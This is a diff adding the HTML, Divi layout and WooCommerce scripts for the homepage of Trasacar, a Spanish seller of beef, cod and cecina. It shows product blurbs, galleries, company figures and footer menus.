+						<div class="et_pb_blurb_description"><p><span>Siendo fieles a nuestra premisa de calidad, hemos conseguido comercializar la variedad Gadus Morhua, la cual distribuimos a la alta hostelería a escala nacional.</span></p></div>
+					</div>
+				</div> <!-- .et_pb_blurb_content -->
+			</div> <!-- .et_pb_blurb -->
+			</div> <!-- .et_pb_column --><div class="et_pb_column et_pb_column_1_3 et_pb_column_5  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				<div class="et_pb_module et_pb_blurb et_pb_blurb_2 et_clickable  et_pb_text_align_left  et_pb_blurb_position_top et_pb_bg_layout_light">
+				
+				
+				<div class="et_pb_blurb_content">
+					<div class="et_pb_main_blurb_image"><a href="trasacar/nuestra-cecina/index.html"><span class="et_pb_image_wrap"><img src="wp-content/uploads/cecina_2.jpg" alt="" srcset="wp-content/uploads/cecina_2.jpg 1920w, wp-content/uploads/cecina_2-300x200.jpg 300w, wp-content/uploads/cecina_2-768x512.jpg 768w, wp-content/uploads/cecina_2-1080x720.jpg 1080w, wp-content/uploads/cecina_2-600x400.jpg 600w" sizes="(max-width: 1920px) 100vw, 1920px" class="et-waypoint et_pb_animation_top" /></span></a></div>
+					<div class="et_pb_blurb_container">
+						<h4 class="et_pb_module_header"><a href="trasacar/nuestra-cecina/index.html">Nuestra Cecina</a></h4>
+						<div class="et_pb_blurb_description"><p><span>El embutido ocupa un lugar de privilegio en las mesas de nuestro país y por ello hemos querido elaborar la cecina</span><span> </span><span class="titulos">Trasacar</span><span>, un producto capaz de satisfacer a los paladares más exigentes.</span></p></div>
+					</div>
+				</div> <!-- .et_pb_blurb_content -->
+			</div> <!-- .et_pb_blurb -->
+			</div> <!-- .et_pb_column -->
+				
+				
+			</div> <!-- .et_pb_row -->
+				
+				
+			</div> <!-- .et_pb_section --><div class="et_pb_section et_pb_section_5 et_pb_section_parallax et_pb_with_background et_section_regular" >
+				
+				<div class="et_parallax_bg_wrap"><div
+						class="et_parallax_bg et_pb_parallax_css"
+						style="background-image: url(wp-content/uploads/trasacar_instalaciones_4.jpg);"
+					></div></div>
+				
+				
+					
+				
+				
+			</div> <!-- .et_pb_section --><div class="et_pb_section et_pb_section_6 et_section_regular" >
+				
+				
+				
+				
+					<div class="et_pb_row et_pb_row_4 et_pb_gutters1">
+				<div class="et_pb_column et_pb_column_4_4 et_pb_column_6  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				<div class="et_pb_module et_pb_gallery et_pb_gallery_1  et_pb_bg_layout_light et_pb_gallery_grid">
+				<div class="et_pb_gallery_items et_post_gallery clearfix" data-per_page="4"><div class="et_pb_gallery_item et_pb_grid_item et_pb_bg_layout_light et_pb_gallery_item_1_0">
+				<div class='et_pb_gallery_image landscape'>
+					<a href="wp-content/uploads/trasacar-AJ2P7332.jpg" title="trasacar-AJ2P7332">
+					<img src="wp-content/uploads/trasacar-AJ2P7332-400x284.jpg" srcset="wp-content/uploads/trasacar-AJ2P7332.jpg 479w, wp-content/uploads/trasacar-AJ2P7332-400x284.jpg 480w" sizes="(max-width:479px) 479px, 100vw" />
+					<span class="et_overlay"></span>
+				</a>
+				</div></div><div class="et_pb_gallery_item et_pb_grid_item et_pb_bg_layout_light et_pb_gallery_item_1_1">
+				<div class='et_pb_gallery_image landscape'>
+					<a href="wp-content/uploads/trasacar-AJ2P7321.jpg" title="trasacar-AJ2P7321">
+					<img src="wp-content/uploads/trasacar-AJ2P7321-400x284.jpg" srcset="wp-content/uploads/trasacar-AJ2P7321.jpg 479w, wp-content/uploads/trasacar-AJ2P7321-400x284.jpg 480w" sizes="(max-width:479px) 479px, 100vw" />
+					<span class="et_overlay"></span>
+				</a>
+				</div></div><div class="et_pb_gallery_item et_pb_grid_item et_pb_bg_layout_light et_pb_gallery_item_1_2">
+				<div class='et_pb_gallery_image landscape'>
+					<a href="wp-content/uploads/trasacar-AJ2P7326.jpg" title="trasacar-AJ2P7326">
+					<img src="wp-content/uploads/trasacar-AJ2P7326-400x284.jpg" srcset="wp-content/uploads/trasacar-AJ2P7326.jpg 479w, wp-content/uploads/trasacar-AJ2P7326-400x284.jpg 480w" sizes="(max-width:479px) 479px, 100vw" />
+					<span class="et_overlay"></span>
+				</a>
+				</div></div><div class="et_pb_gallery_item et_pb_grid_item et_pb_bg_layout_light et_pb_gallery_item_1_3">
+				<div class='et_pb_gallery_image landscape'>
+					<a href="wp-content/uploads/trasacar-AJ2P7316.jpg" title="trasacar-AJ2P7316">
+					<img src="wp-content/uploads/trasacar-AJ2P7316-400x284.jpg" srcset="wp-content/uploads/trasacar-AJ2P7316.jpg 479w, wp-content/uploads/trasacar-AJ2P7316-400x284.jpg 480w" sizes="(max-width:479px) 479px, 100vw" />
+					<span class="et_overlay"></span>
+				</a>
+				</div></div></div><!-- .et_pb_gallery_items --></div><!-- .et_pb_gallery -->
+			</div> <!-- .et_pb_column -->
+				
+				
+			</div> <!-- .et_pb_row -->
+				
+				
+			</div> <!-- .et_pb_section --><div class="et_pb_section et_pb_section_7 et_section_regular" >
+				
+				
+				
+				
+					<div class="et_pb_row et_pb_row_5 et_pb_row_fullwidth et_pb_gutters1">
+				<div class="et_pb_column et_pb_column_4_4 et_pb_column_7  et_pb_css_mix_blend_mode_passthrough et-last-child et_pb_column_empty">
+				
+				
+				
+			</div> <!-- .et_pb_column -->
+				
+				
+			</div> <!-- .et_pb_row -->
+				
+				
+			</div> <!-- .et_pb_section --><div class="et_pb_section et_pb_section_8 et_pb_with_background et_pb_inner_shadow et_section_regular" >
+				
+				
+				
+				
+					<div class="et_pb_row et_pb_row_6">
+				<div class="et_pb_column et_pb_column_1_3 et_pb_column_8  et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				<div class="et_pb_module et_pb_number_counter et_pb_number_counter_0  et_pb_text_align_center et_pb_bg_layout_light et_pb_with_title" data-number-value="50" data-number-separator="">
+				
+				
+				<div class="percent" ><p><span class="percent-value"></span><span class="percent-sign"></span></p></div>
+				<h3 class="title">profesionales a tu disposición</h3>
+			</div><!-- .et_pb_number_counter -->
+			</div> <!-- .et_pb_column --><div class="et_pb_column et_pb_column_1_3 et_pb_column_9  et_pb_css_mix_blend_mode_passthrough">
+				
+				
+				<div class="et_pb_module et_pb_number_counter et_pb_number_counter_1  et_pb_text_align_center et_pb_bg_layout_light et_pb_with_title" data-number-value="60000" data-number-separator="">
+				
+				
+				<div class="percent" ><p><span class="percent-value"></span><span class="percent-sign"></span></p></div>
+				<h3 class="title">kilos semanales de carne</h3>
+			</div><!-- .et_pb_number_counter -->
+			</div> <!-- .et_pb_column --><div class="et_pb_column et_pb_column_1_3 et_pb_column_10  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				<div class="et_pb_module et_pb_number_counter et_pb_number_counter_2  et_pb_text_align_center et_pb_bg_layout_light et_pb_with_title" data-number-value="1982" data-number-separator="">
+				
+				
+				<div class="percent" ><p><span class="percent-value"></span><span class="percent-sign"></span></p></div>
+				<h3 class="title">iniciamos nuestra actividad</h3>
+			</div><!-- .et_pb_number_counter -->
+			</div> <!-- .et_pb_column -->
+				
+				
+			</div> <!-- .et_pb_row -->
+				
+				
+			</div> <!-- .et_pb_section --><div class="et_pb_section et_pb_section_9 et_pb_section_parallax et_pb_with_background et_section_regular" >
+				
+				<div class="et_parallax_bg_wrap"><div
+						class="et_parallax_bg et_pb_parallax_css"
+						style="background-image: url(wp-content/uploads/trasacar-AJ2P7305.jpg);"
+					></div></div>
+				
+				
+					
+				
+				
+			</div> <!-- .et_pb_section --><div class="et_pb_section et_pb_section_10 et_section_regular" >
+				
+				
+				
+				
+					<div class="et_pb_row et_pb_row_7 et_pb_row_fullwidth et_pb_gutters1">
+				<div class="et_pb_column et_pb_column_4_4 et_pb_column_11  et_pb_css_mix_blend_mode_passthrough et-last-child et_pb_column_empty">
+				
+				
+				
+			</div> <!-- .et_pb_column -->
+				
+				
+			</div> <!-- .et_pb_row -->
+				
+				
+			</div> <!-- .et_pb_section --><div class="et_pb_section et_pb_section_11 et_section_regular" >
+				
+				
+				
+				
+					<div class="et_pb_row et_pb_row_8">
+				<div class="et_pb_column et_pb_column_4_4 et_pb_column_12  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				<div class="et_pb_module et_pb_text et_pb_text_6 et_animated  et_pb_text_align_center et_pb_bg_layout_light">
+				
+				
+				<div class="et_pb_text_inner"><h3>CONOCE NUESTROS PROCESOS </h3></div>
+			</div> <!-- .et_pb_text --><div class="et_pb_module et_pb_image et_pb_image_2">
+				
+				
+				<span class="et_pb_image_wrap "><img src="wp-content/uploads/1-CHULETERO-8-COSTILLAS-15-KG-.jpg" alt="" title="" srcset="wp-content/uploads/1-CHULETERO-8-COSTILLAS-15-KG-.jpg 1920w, wp-content/uploads/1-CHULETERO-8-COSTILLAS-15-KG--300x200.jpg 300w, wp-content/uploads/1-CHULETERO-8-COSTILLAS-15-KG--768x512.jpg 768w, wp-content/uploads/1-CHULETERO-8-COSTILLAS-15-KG--1080x720.jpg 1080w, wp-content/uploads/1-CHULETERO-8-COSTILLAS-15-KG--600x400.jpg 600w" sizes="(max-width: 1920px) 100vw, 1920px" /></span>
+			</div><div class="et_pb_module et_pb_text et_pb_text_7  et_pb_text_align_center et_pb_bg_layout_light">
+				
+				
+				<div class="et_pb_text_inner"><div id="column">
+<div class="holder">
+<h2>Presentación y envasado</h2>
+</div>
+</div></div>
+			</div> <!-- .et_pb_text --><div class="et_pb_module et_pb_text et_pb_text_8 et_animated  et_pb_text_align_center et_pb_bg_layout_light">
+				
+				
+				<div class="et_pb_text_inner"><p>Confeccionamos una gran variedad de cortes para adaptarnos al consumo y al perfil de cualquier cliente.</p></div>
+			</div> <!-- .et_pb_text -->
+			</div> <!-- .et_pb_column -->
+				
+				
+			</div> <!-- .et_pb_row --><div class="et_pb_row et_pb_row_9 productos">
+				<div class="et_pb_column et_pb_column_4_4 et_pb_column_13  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				<div class="et_pb_module et_pb_video et_pb_video_0">
+				
+				
+				
+				<div style="background-image:url(wp-content/uploads/maxresdefault.jpg)" class="et_pb_video_overlay"><div class="et_pb_video_overlay_hover"><a href="index.html#" class="et_pb_video_play"></a></div></div>
+			</div>
+			</div> <!-- .et_pb_column -->
+				
+				
+			</div> <!-- .et_pb_row -->
+				
+				
+			</div> <!-- .et_pb_section --><div class="et_pb_section et_pb_section_12 et_section_regular" >
+				
+				
+				
+				
+					<div class="et_pb_row et_pb_row_10 et_pb_row_fullwidth et_pb_gutters1">
+				<div class="et_pb_column et_pb_column_4_4 et_pb_column_14  et_pb_css_mix_blend_mode_passthrough et-last-child et_pb_column_empty">
+				
+				
+				
+			</div> <!-- .et_pb_column -->
+				
+				
+			</div> <!-- .et_pb_row -->
+				
+				
+			</div> <!-- .et_pb_section --><div class="et_pb_section et_pb_section_13 et_section_regular" >
+				
+				
+				
+				
+					<div class="et_pb_row et_pb_row_11 et_pb_gutters1">
+				<div class="et_pb_column et_pb_column_4_4 et_pb_column_15  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				<div class="et_pb_module et_pb_gallery et_pb_gallery_5  et_pb_bg_layout_light et_pb_gallery_grid">
+				<div class="et_pb_gallery_items et_post_gallery clearfix" data-per_page="4"><div class="et_pb_gallery_item et_pb_grid_item et_pb_bg_layout_light et_pb_gallery_item_5_0">
+				<div class='et_pb_gallery_image landscape'>
+					<a href="wp-content/uploads/TRASACAR-AJ2P7750.jpg" title="TRASACAR-AJ2P7750">
+					<img src="wp-content/uploads/TRASACAR-AJ2P7750-400x284.jpg" srcset="wp-content/uploads/TRASACAR-AJ2P7750.jpg 479w, wp-content/uploads/TRASACAR-AJ2P7750-400x284.jpg 480w" sizes="(max-width:479px) 479px, 100vw" />
+					<span class="et_overlay"></span>
+				</a>
+				</div></div><div class="et_pb_gallery_item et_pb_grid_item et_pb_bg_layout_light et_pb_gallery_item_5_1">
+				<div class='et_pb_gallery_image landscape'>
+					<a href="wp-content/uploads/TRASACAR-AJ2P7752.jpg" title="TRASACAR-AJ2P7752">
+					<img src="wp-content/uploads/TRASACAR-AJ2P7752-400x284.jpg" srcset="wp-content/uploads/TRASACAR-AJ2P7752.jpg 479w, wp-content/uploads/TRASACAR-AJ2P7752-400x284.jpg 480w" sizes="(max-width:479px) 479px, 100vw" />
+					<span class="et_overlay"></span>
+				</a>
+				</div></div><div class="et_pb_gallery_item et_pb_grid_item et_pb_bg_layout_light et_pb_gallery_item_5_2">
+				<div class='et_pb_gallery_image landscape'>
+					<a href="wp-content/uploads/TRASACAR-AJ2P7754.jpg" title="TRASACAR-AJ2P7754">
+					<img src="wp-content/uploads/TRASACAR-AJ2P7754-400x284.jpg" srcset="wp-content/uploads/TRASACAR-AJ2P7754.jpg 479w, wp-content/uploads/TRASACAR-AJ2P7754-400x284.jpg 480w" sizes="(max-width:479px) 479px, 100vw" />
+					<span class="et_overlay"></span>
+				</a>
+				</div></div><div class="et_pb_gallery_item et_pb_grid_item et_pb_bg_layout_light et_pb_gallery_item_5_3">
+				<div class='et_pb_gallery_image landscape'>
+					<a href="wp-content/uploads/TRASACAR-AJ2P7756.jpg" title="TRASACAR-AJ2P7756">
+					<img src="wp-content/uploads/TRASACAR-AJ2P7756-400x284.jpg" srcset="wp-content/uploads/TRASACAR-AJ2P7756.jpg 479w, wp-content/uploads/TRASACAR-AJ2P7756-400x284.jpg 480w" sizes="(max-width:479px) 479px, 100vw" />
+					<span class="et_overlay"></span>
+				</a>
+				</div></div></div><!-- .et_pb_gallery_items --></div><!-- .et_pb_gallery -->
+			</div> <!-- .et_pb_column -->
+				
+				
+			</div> <!-- .et_pb_row -->
+				
+				
+			</div> <!-- .et_pb_section --><div class="et_pb_section et_pb_section_14 et_pb_section_parallax et_pb_with_background et_section_regular" >
+				
+				<div class="et_parallax_bg_wrap"><div
+						class="et_parallax_bg et_pb_parallax_css"
+						style="background-image: url(wp-content/uploads/trasacar-AJ2P7310.jpg);"
+					></div></div>
+				
+				
+					
+				
+				
+			</div> <!-- .et_pb_section -->		</div><!-- .et_builder_inner_content -->
+	</div><!-- .et-l -->
+	
+			
+		</div><!-- #et-boc -->
+							</div> <!-- .entry-content -->
+
+				
+				</article> <!-- .et_pb_post -->
+
+			
+
+</div> <!-- #main-content -->
+
+
+	<span class="et_pb_scroll_top et-pb-icon"></span>
+
+
+			<footer id="main-footer">
+				
+<div class="container">
+    <div id="footer-widgets" class="clearfix">
+		<div class="footer-widget"><div id="nav_menu-4" class="fwidget et_pb_widget widget_nav_menu"><h4 class="title">Trasacar</h4><div class="menu-empresa-container"><ul id="menu-empresa" class="menu"><li id="menu-item-4589" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4589"><a href="index.html@p=3304.html">Conócenos</a></li>
+<li id="menu-item-4590" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4590"><a href="index.html@p=367.html">Nuestro origen</a></li>
+<li id="menu-item-4591" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4591"><a href="index.html@p=347.html">Instalaciones</a></li>
+<li id="menu-item-4592" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4592"><a href="index.html@p=371.html">Calidad</a></li>
+<li id="menu-item-4593" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4593"><a href="index.html@p=3305.html">Hostelería</a></li>
+<li id="menu-item-4594" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4594"><a href="index.html@p=3310.html">Localización</a></li>
+</ul></div></div> <!-- end .fwidget --></div> <!-- end .footer-widget --><div class="footer-widget"><div id="nav_menu-2" class="fwidget et_pb_widget widget_nav_menu"><h4 class="title">Productos</h4><div class="menu-productos-container"><ul id="menu-productos" class="menu"><li id="menu-item-4622" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4622"><a href="index.html@p=436.html">Nuestras carnes</a></li>
+<li id="menu-item-4623" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4623"><a href="index.html@p=438.html">Nuestro bacalao</a></li>
+<li id="menu-item-4624" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4624"><a href="index.html@p=440.html">Nuestra cecina</a></li>
+<li id="menu-item-4625" class="destacado menu-item menu-item-type-post_type menu-item-object-page menu-item-4625"><a href="index.html@p=2605.html">Conoce lo que comes</a></li>
+</ul></div></div> <!-- end .fwidget --></div> <!-- end .footer-widget --><div class="footer-widget"><div id="nav_menu-3" class="fwidget et_pb_widget widget_nav_menu"><h4 class="title">Particulares</h4><div class="menu-particulares-horizontal-container"><ul id="menu-particulares-horizontal" class="menu"><li id="menu-item-4615" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-4615"><a href="categoria/chuleton/index.html">Chuletón</a></li>
+<li id="menu-item-4617" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-4617"><a href="categoria/entrecote/index.html">Entrecote</a></li>
+<li id="menu-item-4618" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-4618"><a href="categoria/otros-cortes/index.html">Otros cortes</a></li>
+<li id="menu-item-7113" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-7113"><a href="categoria/packs/index.html">Otros Packs</a></li>
+<li id="menu-item-4614" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-4614"><a href="categoria/cecina/index.html">Cecina</a></li>
+<li id="menu-item-4613" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-4613"><a href="categoria/bacalao/index.html">Bacalao</a></li>
+<li id="menu-item-4616" class="menu-item menu-item-type-taxonomy menu-item-object-product_cat menu-item-4616"><a href="categoria/conservas-de-lujo/index.html">Conservas de lujo</a></li>
+<li id="menu-item-4620" class="destacado menu-item menu-item-type-post_type menu-item-object-page menu-item-4620"><a href="index.html@p=2605.html">Conoce lo que comes</a></li>
+<li id="menu-item-4621" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4621"><a href="index.html@p=3311.html">Condiciones de compra</a></li>
+</ul></div></div> <!-- end .fwidget --></div> <!-- end .footer-widget --><div class="footer-widget"><div id="nav_menu-5" class="fwidget et_pb_widget widget_nav_menu"><h4 class="title">Información</h4><div class="menu-informacion-container"><ul id="menu-informacion" class="menu"><li id="menu-item-4595" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4595"><a href="index.html@p=13.html">Mi cuenta</a></li>
+<li id="menu-item-4597" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4597"><a href="index.html@p=3307.html">Hacer pedido</a></li>
+<li id="menu-item-4596" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4596"><a href="index.html@p=2605.html">Conoce lo que comes</a></li>
+<li id="menu-item-4598" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4598"><a href="index.html@p=1496.html">Presentación y caducidad</a></li>
+<li id="menu-item-4599" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4599"><a href="index.html@p=3312.html">Envíos y entregas</a></li>
+<li id="menu-item-4601" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4601"><a href="index.html@p=3311.html">Condiciones de compra</a></li>
+<li id="menu-item-4600" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4600"><a href="index.html@p=4270.html">Contacto</a></li>
+</ul></div></div> <!-- end .fwidget --></div> <!-- end .footer-widget -->    </div> <!-- #footer-widgets -->
+</div>    <!-- .container -->
+
+		
+				<div id="et-footer-nav">
+					<div class="container">
+						<ul id="menu-menu-inferior-formas-de-pago" class="bottom-nav"><li id="menu-item-4607" class="descarga-catalogo menu-item menu-item-type-custom menu-item-object-custom menu-item-4607"><a target="_blank" rel="noopener noreferrer" href="https://www.carnesrojas.es/landing/CatalogoTrasacar.pdf">Descarga nuestro catálogo</a></li>
+<li id="menu-item-4608" class="tarjetas menu-item menu-item-type-custom menu-item-object-custom menu-item-4608"><a href="index.html#"><img src="wp-content/uploads/paypal.png" class="tarjetas"></a></li>
+<li id="menu-item-4609" class="tarjetas menu-item menu-item-type-custom menu-item-object-custom menu-item-4609"><a href="index.html#"><img src="wp-content/uploads/visa.png" class="tarjetas"></a></li>
+<li id="menu-item-4610" class="tarjetas menu-item menu-item-type-custom menu-item-object-custom menu-item-4610"><a href="index.html#"><img src="wp-content/uploads/mastercard.png" class="tarjetas"></a></li>
+</ul>					</div>
+				</div> <!-- #et-footer-nav -->
+
+			
+				<div id="footer-bottom">
+					<div class="container clearfix">
+				<div id="footer-info">Trasacar © 2019 | <a href="index.html@p=3311.html" target="_blank">Condiciones de compra</a> | <a href="index.html@p=3313.html" target="_blank">Aviso legal</a> | <a href="index.html@p=3314.html" target="_blank">Política de cookies</a> | <a href="contacto.1.html">Contacto</a> <div id="credits">Web design <a href="http://www.fanjulyasociados.com/" target="_blank">Fanjul y Asociados</a></div></div>					</div>	<!-- .container -->
+				</div>
+			</footer> <!-- #main-footer -->
+		</div> <!-- #et-main-area -->
+
+
+	</div> <!-- #page-container -->
+
+		<script type="text/javascript">
+				var et_animation_data = [{"class":"et_pb_text_0","style":"slideBottom","repeat":"once","duration":"1000ms","delay":"0ms","intensity":"50%","starting_opacity":"0%","speed_curve":"ease-in-out"},{"class":"et_pb_text_2","style":"slideTop","repeat":"once","duration":"1000ms","delay":"0ms","intensity":"4%","starting_opacity":"0%","speed_curve":"ease-in-out"},{"class":"et_pb_text_3","style":"slideBottom","repeat":"once","duration":"1000ms","delay":"0ms","intensity":"50%","starting_opacity":"0%","speed_curve":"ease-in-out"},{"class":"et_pb_text_5","style":"slideTop","repeat":"once","duration":"1000ms","delay":"0ms","intensity":"4%","starting_opacity":"0%","speed_curve":"ease-in-out"},{"class":"et_pb_text_6","style":"slideBottom","repeat":"once","duration":"1000ms","delay":"0ms","intensity":"50%","starting_opacity":"0%","speed_curve":"ease-in-out"},{"class":"et_pb_text_8","style":"slideTop","repeat":"once","duration":"1000ms","delay":"0ms","intensity":"4%","starting_opacity":"0%","speed_curve":"ease-in-out"}];
+				var et_link_options_data = [{"class":"et_pb_fullwidth_header_0","url":"https:\/\/trasacar.es\/quedate-en-casa\/","target":"_self"},{"class":"et_pb_blurb_0","url":"https:\/\/trasacar.es\/trasacar\/nuestras-carnes\/","target":"_self"},{"class":"et_pb_blurb_1","url":"https:\/\/trasacar.es\/trasacar\/nuestro-bacalao\/","target":"_self"},{"class":"et_pb_blurb_2","url":"https:\/\/trasacar.es\/trasacar\/nuestra-cecina\/","target":"_self"}];
+			</script>
+		<script type="text/javascript">
+		var c = document.body.className;
+		c = c.replace(/woocommerce-no-js/, 'woocommerce-js');
+		document.body.className = c;
+	</script>
+	<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-152572352-1"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
 
-  gtag('config', 'UA-121093078-1');
+  gtag('config', 'UA-152572352-1');
 </script>
 
+<script>
 
-    </body>
-    </html>
+// Colapse menú móvil
+(function($) {
+      
+    function setup_collapsible_submenus() {
+        var $menu = $('#mobile_menu'),
+            top_level_link = '#mobile_menu .menu-item-has-children > a';
+             
+        $menu.find('a').each(function() {
+            $(this).off('click');
+              
+            if ( $(this).is(top_level_link) ) {
+                $(this).attr('href', '#');
+            }
+              
+            if ( ! $(this).siblings('.sub-menu').length ) {
+                $(this).on('click', function(event) {
+                    $(this).parents('.mobile_nav').trigger('click');
+                });
+            } else {
+                $(this).on('click', function(event) {
+                    event.preventDefault();
+                    $(this).parent().toggleClass('visible');
+                });
+            }
+        });
+    }
+      
+    $(window).load(function() {
+        setTimeout(function() {
+            setup_collapsible_submenus();
+        }, 700);
+    });
+ 
+})(jQuery);
+
+jQuery(function($){
+    // Cambia offset -en px- para mostrar antes o después el fixed header
+    var offset = 100;
+    var $header = $('#main-header');
+    
+    // Override the addClass to prevent fixed header class from being added before offset reached
+    var addclass = $.fn.addClass;
+    $.fn.addClass = function(){
+        var result = addclass.apply(this, arguments);
+        if ($(window).scrollTop() < offset) {
+            $header.removeClass('et-fixed-header');
+        }
+        return result;
+    }
+
+    // Remove fixed header class initially
+    $header.removeClass('et-fixed-header');
+    
+    // Create waypoint which adds / removes fixed header class when offset reached
+    $('body').waypoint({
+        handler: function(d) {
+            $header.toggleClass('et-fixed-header',(d==='down'));
+        },
+        offset: -offset
+    });
+    
+});
+
+
+
+// Referencias galería de productos
+    jQuery(document).ready(function($){
+      $(".et_pb_gallery_title").html(function(){
+      var text= $(this).text().trim().split(" ");
+      var first = text.shift();
+      return (text.length > 0 ? "<span class='referencia'>"+ first + "</span> " : first) + text.join(" ");
+    });
+});
+	
+	
+// Miniatura timeline
+
+function change_timeline_express_announcement_image_size( $image_size ) {
+    $image_size = 'full';
+    return $image_size;
+}
+add_filter( 'timeline-express-announcement-img-size' , 'change_timeline_express_announcement_image_size' );
+
+</script>
+
+<link rel='stylesheet' id='woocommercebulkdiscount-style-css'  href='wp-content/plugins/woocommerce-bulk-discount/css/style.css' type='text/css' media='all' />
+<script type='text/javascript' src='wp-content/plugins/woocommerce/assets/js/jquery-blockui/jquery.blockUI.min.js'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var wc_add_to_cart_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%","i18n_view_cart":"Ver carrito","cart_url":"https:\/\/trasacar.es\/carrito\/","is_cart":"","cart_redirect_after_add":"no"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='wp-content/plugins/woocommerce/assets/js/frontend/add-to-cart.min.js'></script>
+<script type='text/javascript' src='wp-content/plugins/woocommerce/assets/js/js-cookie/js.cookie.min.js'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var woocommerce_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='wp-content/plugins/woocommerce/assets/js/frontend/woocommerce.min.js'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var wc_cart_fragments_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%","cart_hash_key":"wc_cart_hash_67b12121b64cd7ebc15708359c267a1a-es","fragment_name":"wc_fragments_67b12121b64cd7ebc15708359c267a1a","request_timeout":"5000"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='wp-content/plugins/woocommerce/assets/js/frontend/cart-fragments.min.js'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var DIVI = {"item_count":"%d Item","items_count":"%d Items"};
+var et_shortcodes_strings = {"previous":"Anterior","next":"Siguiente"};
+var et_pb_custom = {"ajaxurl":"https:\/\/trasacar.es\/wp-admin\/admin-ajax.php","images_uri":"https:\/\/trasacar.es\/wp-content\/themes\/Divi\/images","builder_images_uri":"https:\/\/trasacar.es\/wp-content\/themes\/Divi\/includes\/builder\/images","et_frontend_nonce":"cbd8d2ceb7","subscription_failed":"Por favor, revise los campos a continuaci\u00f3n para asegurarse de que la informaci\u00f3n introducida es correcta.","et_ab_log_nonce":"e775af93a0","fill_message":"Por favor, rellene los siguientes campos:","contact_error_message":"Por favor, arregle los siguientes errores:","invalid":"De correo electr\u00f3nico no v\u00e1lida","captcha":"Captcha","prev":"Anterior","previous":"Anterior","next":"Siguiente","wrong_captcha":"Ha introducido un n\u00famero equivocado de captcha.","wrong_checkbox":"Checkbox","ignore_waypoints":"no","is_divi_theme_used":"1","widget_search_selector":".widget_search","ab_tests":[],"is_ab_testing_active":"","page_id":"4388","unique_test_id":"","ab_bounce_rate":"5","is_cache_plugin_active":"no","is_shortcode_tracking":"","tinymce_uri":""}; var et_frontend_scripts = {"builderCssContainerPrefix":"#et-boc","builderCssLayoutPrefix":"#et-boc .et-l"};
+var et_pb_box_shadow_elements = [];
+var et_pb_motion_elements = {"desktop":[],"tablet":[],"phone":[]};
+/* ]]> */
+</script>
+<script type='text/javascript' src='wp-content/themes/Divi/js/custom.unified.js'></script>
+<script type='text/javascript' src='wp-content/plugins/woocommerce-multilingual/res/js/front-scripts.min.js'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var actions = {"is_lang_switched":"0","force_reset":"0"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='wp-content/plugins/woocommerce-multilingual/res/js/cart_widget.min.js'></script>
+<script type='text/javascript' src='wp-content/themes/Divi/core/admin/js/common.js'></script>
+<script type='text/javascript' src='wp-includes/js/wp-embed.min.js'></script>
+
+		<!-- Cookie Notice plugin v1.2.51 by Digital Factory https://dfactory.eu/ -->
+		<div id="cookie-notice" role="banner" class="cookie-notice-hidden cookie-revoke-hidden cn-position-bottom" aria-label="Cookie Notice" style="background-color: #000;"><div class="cookie-notice-container" style="color: #fff;"><span id="cn-notice-text" class="cn-text-container">Utilizamos cookies para asegurar que damos la mejor experiencia al usuario en nuestra web. Si sigues utilizando este sitio asumiremos que estás de acuerdo.</span><span id="cn-notice-buttons" class="cn-buttons-container"><a href="index.html#" id="cn-accept-cookie" data-cookie-set="accept" class="cn-set-cookie cn-button bootstrap button">Vale</a></span></div>
+			
+		</div>
+		<!-- / Cookie Notice plugin --></body>
+</html>
